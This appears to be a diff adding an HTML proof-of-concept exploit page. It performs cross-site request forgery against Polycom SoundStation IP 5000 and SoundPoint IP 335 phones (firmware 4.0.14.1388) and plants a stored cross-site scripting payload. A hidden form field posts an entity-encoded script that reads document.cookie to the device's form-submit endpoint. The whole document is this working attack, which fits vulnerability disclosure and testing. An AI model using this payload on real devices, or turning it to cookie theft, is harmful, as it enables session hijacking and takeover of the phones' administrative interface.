@@ -1,0 +1,12 @@
+<html>
+  <!-- Post XSS via CSRF on Soundstation IP 5000 & SoundPoint IP 335 UC ver 4.0.14.1388  -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.128.17/form-submit" method="POST">
+      <input type="hidden" name="250&#58;1" value="&quot;&gt;&lt;Script&gt;alert&#40;document&#46;cookie&#41;&lt;&#47;Script&gt;" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
